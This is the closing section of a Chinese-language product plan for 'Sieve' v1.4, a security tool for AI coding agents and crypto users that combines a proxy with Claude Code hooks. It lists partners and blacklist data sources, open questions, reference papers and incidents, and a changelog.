| 慢雾 SlowMist | misttrack-skills、恶意地址 SDK | 通过 @evilcos 接洽 | ⭐⭐⭐ | Week 11 起 |
| ScamSniffer | 黑名单(7 天延迟开源 → Pro $999/月) | 商业合作 | ⭐⭐⭐ | Phase 2 |
| GoPlus Security | 免费 Token API + Address Security API | 直接 API | ⭐⭐ | Phase 2 |
| Chainabuse(TRM Labs) | 钱包黑名单 API | 免费 + 商业 | ⭐⭐ | Phase 2 |
| L2BEAT | 跨链桥 registry | 开源数据 | ⭐ | Phase 2 |
| Sourcify | 4byte selector | 开源副本 | ⭐⭐ | Phase 2 |
| Forta Network | Scam Detector v2 | $899/月 | ⭐ | 选购 |

### 13.3 内容/研究合作

| 合作方 | 价值 | 接洽方式 |
|-------|------|---------|
| Chaofan Shou (@Fried_rice) | UCSB 论文一作,Fuzzland CTO | Week 11 主动接洽 |
| 慢雾 @evilcos | 中文圈 crypto 安全 KOL | Week 11 主动接洽,数据 + 内容双合作 |
| Yu Feng | UCSB 教授,Fuzzland 联创 | 通过 Chaofan 间接接洽 |

---

## 14. Open Questions

1. 正式产品名 —— Week 6-8 之间必须定
2. 冷启动文章排序 —— Week 12 GA 同步发文章 1 + 2,Week 14 发文章 3
3. 法律实体 —— 香港 vs 新加坡 vs Stripe Atlas?(建议香港)
4. Week 9 闭测邀请名单 —— 5 个 hackathon builder + 审计研究员
5. 加密收款实现 —— Coinbase Commerce / Stripe Crypto / 自部署?
6. 降级模式 UI —— 试用结束如何过渡到只读警告
7. **🆕 GUI App 跨平台时机** —— Windows/Linux 在 Phase 2 哪个点做?
8. **🆕 sieve-hook 用 Rust 还是 shell script** —— 启动速度 vs 维护成本权衡

---

## 15. 关键参考资料

### 15.1 学术论文
- *Your Agent Is Mine* (UCSB+Fuzzland, arXiv:2604.08407, 2026-04)
- *Blockchain Address Poisoning* (arXiv:2501.16681, 2025)
- *Trojan Source* (USENIX '23, arXiv:2111.00169)

### 15.2 关键事件
- LiteLLM 1.82.7/1.82.8 PyPI 投毒(2026-03-24)
- @solana/web3.js 投毒(2024-12-02)
- Pink Drainer EIP-712 数字化绕过

### 15.3 必读项目
- gitleaks / TruffleHog / detect-secrets
- Cloudflare Pingora
- StepSecurity Harden-Runner
- Sigstore + Reproducible Builds
- **🆕 Anthropic Claude Code hooks 文档**(PreToolUse / PostToolUse 机制)

### 15.4 监管参考
- 《生成式人工智能服务管理暂行办法》
- 上海市八部门虚拟货币业务通知(2026-02)
- 个人信息保护法

---

## 文档结束

> **核心一句话**:Sieve v1.4 在 v1.3 基础上完成了真正的产品化架构——HIPS 弹窗 + Native GUI + setup 自动配置 + Claude Code hooks 双层防御。这不是工程细节,是真正决定产品能不能装得上、用户能不能用得舒服的核心架构。它的执行复杂度比 v1.3 高一些,但解决的问题是真的——doskey 在 Week 4 已经亲身验证了 v1.3 的痛点。

---

## v1.3 → v1.4 changelog

- **△** §5.3 处置矩阵从一维四级改为二维(出站 × 入站 × 严重度)
- **△** §6.1 整体架构图重写,加入 Native GUI App + sieve-hook 双层防御
- **+** §1.3 不是什么:加入"不做操作系统级流量拦截"和"不在 API 协议层撒谎"
- **+** §4.1~4.4 场景重写,展示 HIPS 弹窗 + 自动脱敏 + Hook 终端弹窗的具体 UX
- **+** §5.4 HIPS 弹窗架构 + 超时策略表(整节新增)
- **+** §6.4 Native GUI App 职责
- **+** §6.5 IPC 协议设计
- **+** §6.6 部署形态:Phase 1 macOS only
- **+** §6.7 双层防御(代理 + Claude Code hooks)
- **+** §6.8 操作系统级拦截推到 Phase 3
- **+** §9 第 11-13 条硬约束
- **+** §10.1 Week 5 重写为 Native GUI App + sieve setup 工具
- **+** §12 风险登记册新增 4 条架构相关风险
- **+** §14 Open Questions 第 7、8 条

— *基于 v1.3 + doskey Week 4 工程实践反馈整理,2026-04-26*
